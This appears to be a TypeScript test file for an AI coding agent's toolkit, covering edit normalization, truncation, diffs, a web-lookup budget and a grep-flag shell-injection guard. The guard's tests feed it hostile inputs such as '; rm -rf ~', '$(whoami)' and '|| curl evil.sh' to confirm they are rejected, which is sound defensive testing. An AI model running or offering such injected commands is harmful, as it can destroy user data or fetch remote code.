import { describe, expect, it } from "bun:test"
import { Arbitrary, Effect, FastCheck as fc, Layer, Schema } from "effect"
import { Failure } from "../entities/Failure.js"
import { ApprovalAllowAllLive } from "../ports/Approval.js"
import { FileSystem } from "../ports/FileSystem.js"
import { Http } from "../ports/Http.js"
import { Shell } from "../ports/Shell.js"
import { WebSearch } from "../ports/WebSearch.js"
import {
  firstLine,
  makeCodingHandlers,
  normalizeEdits,
  parseGrepFlags,
  PlanStep,
  type ScopeBinding,
  slugify,
  truncateOutput,
  unifiedDiff,
} from "./codingToolkit.js"

describe("normalizeEdits", () => {
  it("passes the canonical edits array through unchanged", () => {
    const edits = [
      { oldText: "a", newText: "b" },
      { oldText: "c", newText: "d" },
    ]
    expect(normalizeEdits({ edits })).toEqual(edits)
  })

  it("wraps the flat single-edit form into one edit", () => {
    // The shape models trained on Claude Code's Edit tool emit for one edit.
    expect(normalizeEdits({ oldText: "foo", newText: "bar" })).toEqual([
      { oldText: "foo", newText: "bar" },
    ])
  })

  it("treats a flat oldText with no newText as a deletion", () => {
    expect(normalizeEdits({ oldText: "foo" })).toEqual([{ oldText: "foo", newText: "" }])
  })

  it("prefers a non-empty edits array over the flat fields", () => {
    expect(
      normalizeEdits({
        edits: [{ oldText: "a", newText: "b" }],
        oldText: "ignored",
        newText: "ignored",
      }),
    ).toEqual([{ oldText: "a", newText: "b" }])
  })

  it("falls back to the flat form when edits is an empty array", () => {
    expect(normalizeEdits({ edits: [], oldText: "foo", newText: "bar" })).toEqual([
      { oldText: "foo", newText: "bar" },
    ])
  })

  it("returns no edits when neither shape is present", () => {
    expect(normalizeEdits({})).toEqual([])
    expect(normalizeEdits({ edits: [] })).toEqual([])
  })
})

describe("slugify — memory filename stems", () => {
  it("lowercases and collapses non-alphanumerics to single hyphens", () => {
    expect(slugify("Why we route per-request, not per-layer")).toBe(
      "why-we-route-per-request-not-per-layer",
    )
  })

  it("trims leading/trailing hyphens", () => {
    expect(slugify("  -- Edge case! -- ")).toBe("edge-case")
  })

  it("falls back to 'memory' when nothing usable remains", () => {
    expect(slugify("!!!")).toBe("memory")
    expect(slugify("")).toBe("memory")
  })

  it("caps the stem length", () => {
    expect(slugify("a".repeat(200)).length).toBeLessThanOrEqual(60)
  })
})

describe("firstLine — default memory summary", () => {
  it("returns the first non-empty trimmed line", () => {
    expect(firstLine("\n\n  the decision  \nmore detail")).toBe("the decision")
  })

  it("returns empty string for all-blank content", () => {
    expect(firstLine("\n   \n")).toBe("")
  })
})

describe("parseGrepFlags — shell-injection guard", () => {
  it("accepts absent flags (no extra)", () => {
    expect(parseGrepFlags(undefined)).toEqual({ ok: true, extra: "" })
    expect(parseGrepFlags("   ")).toEqual({ ok: true, extra: "" })
  })

  it("accepts bare short and long flags, re-joined with a leading space", () => {
    expect(parseGrepFlags("-i")).toEqual({ ok: true, extra: " -i" })
    expect(parseGrepFlags("-iw")).toEqual({ ok: true, extra: " -iw" })
    expect(parseGrepFlags("-i -w")).toEqual({ ok: true, extra: " -i -w" })
    expect(parseGrepFlags("--ignore-case")).toEqual({ ok: true, extra: " --ignore-case" })
  })

  it("rejects shell metacharacters and =value forms, naming the bad token", () => {
    // The classic injection: a `;`-separated command tacked onto the flags.
    expect(parseGrepFlags("; rm -rf ~")).toEqual({ ok: false, bad: ";" })
    expect(parseGrepFlags("-i; rm -rf ~")).toEqual({ ok: false, bad: "-i;" })
    expect(parseGrepFlags("$(whoami)")).toEqual({ ok: false, bad: "$(whoami)" })
    expect(parseGrepFlags("-i `id`")).toEqual({ ok: false, bad: "`id`" })
    expect(parseGrepFlags("--include=*.ts")).toEqual({ ok: false, bad: "--include=*.ts" })
    expect(parseGrepFlags("-i || curl evil.sh")).toEqual({ ok: false, bad: "||" })
  })
})

describe("unifiedDiff", () => {
  it("is empty when nothing changed", () => {
    expect(unifiedDiff("a\nb\n", "a\nb\n", "f.ts")).toBe("")
  })

  it("emits a unified diff with file headers for a single-line change", () => {
    const diff = unifiedDiff("a\nb\nc\n", "a\nB\nc\n", "f.ts")
    expect(diff).toContain("--- f.ts")
    expect(diff).toContain("+++ f.ts")
    expect(diff).toContain("-b")
    expect(diff).toContain("+B")
  })
})

describe("truncateOutput", () => {
  it("fitting output is untouched", () => {
    expect(truncateOutput("short", 100)).toBe("short")
  })

  it("oversized output keeps head AND tail — the conclusion survives", () => {
    const lines = Array.from({ length: 1000 }, (_, i) => `line ${i}`)
    lines.push(" 199 pass", " 1 fail")
    const out = truncateOutput(lines.join("\n"), 2000)
    expect(out.length).toBeLessThan(2200)
    expect(out.startsWith("line 0")).toBe(true) // head
    expect(out).toContain(" 1 fail") // the tail summary that head-only cuts erased
    expect(out).toContain("bytes omitted from the middle")
  })
})

describe("web-lookup budget (subAgentFetchBudget) — the convergence brake", () => {
  const ports = Layer.mergeAll(
    Layer.succeed(FileSystem, FileSystem.of({} as never)),
    Layer.succeed(Shell, Shell.of({} as never)),
    Layer.succeed(
      Http,
      Http.of({
        get: () =>
          Effect.succeed({ status: 200, contentType: "text/plain", body: "ok" }),
      } as never),
    ),
    Layer.succeed(
      WebSearch,
      WebSearch.of({ search: () => Effect.succeed({ answer: "a", sources: [] }) }),
    ),
    ApprovalAllowAllLive,
  )

  const binding = (fetchBudget?: number): ScopeBinding => ({
    rootDir: "/w",
    displayRoot: "/w",
    enforceWrite: true,
    allowBash: false,
    ...(fetchBudget !== undefined ? { fetchBudget } : {}),
  })

  // Drive a mix of search_web / web_fetch calls and report each as "ok" or its
  // error tag, so we can assert exactly when the cap bites.
  const tag = (r: { _tag: "Left" | "Right"; left?: unknown }): string =>
    r._tag === "Right" ? "ok" : String((r.left as { error?: unknown }).error)

  const runLookups = (b: ScopeBinding, kinds: ReadonlyArray<"search" | "fetch">) =>
    Effect.gen(function* () {
      const h = yield* makeCodingHandlers(b)
      const out: string[] = []
      for (const k of kinds) {
        if (k === "search") {
          out.push(tag(yield* Effect.either(h.search_web({ query: "q" }))))
        } else {
          out.push(tag(yield* Effect.either(h.web_fetch({ url: "https://example.com" }))))
        }
      }
      return out
    }).pipe(Effect.provide(ports), Effect.runPromise)

  it("caps combined web_fetch + search_web at the budget, then refuses", async () => {
    const out = await runLookups(binding(2), ["search", "fetch", "search"])
    expect(out).toEqual(["ok", "ok", "FetchBudgetReached"])
  })

  it("an unset budget (the root coder) never caps", async () => {
    const out = await runLookups(binding(undefined), Array(6).fill("fetch"))
    expect(out).toEqual(Array(6).fill("ok"))
  })

  it("budget 0 disables the cap", async () => {
    const out = await runLookups(binding(0), Array(5).fill("search"))
    expect(out).toEqual(Array(5).fill("ok"))
  })
})

describe("properties — tool schemas + truncateOutput", () => {
  const roundTrip = <A, I>(schema: Schema.Schema<A, I>) => {
    const encode = Schema.encodeSync(schema)
    const decode = Schema.decodeUnknownSync(schema)
    return (value: A) => expect(decode(encode(value))).toEqual(value)
  }

  it("PlanStep and Failure survive encode→decode", () => {
    fc.assert(fc.property(Arbitrary.make(PlanStep), roundTrip(PlanStep)), { numRuns: 100 })
    fc.assert(fc.property(Arbitrary.make(Failure), roundTrip(Failure)), { numRuns: 100 })
  })

  it("truncateOutput: identity when fitting; else head+marker+tail with a bounded size", () => {
    fc.assert(
      fc.property(
        fc.oneof(fc.string({ maxLength: 600 }), fc.fullUnicodeString({ maxLength: 600 })),
        fc.integer({ min: 0, max: 400 }),
        (s, max) => {
          const out = truncateOutput(s, max)
          if (s.length <= max) {
            expect(out).toBe(s)
          } else {
            const head = Math.floor(max * 0.7)
            expect(out.startsWith(s.slice(0, head))).toBe(true)
            expect(out.endsWith(s.slice(s.length - (max - head)))).toBe(true)
            expect(out).toContain("truncated:")
            // The marker means output may EXCEED max — that is the contract.
            expect(out.length).toBeLessThanOrEqual(max + 96)
          }
        },
      ),
      { numRuns: 300 },
    )
  })
})
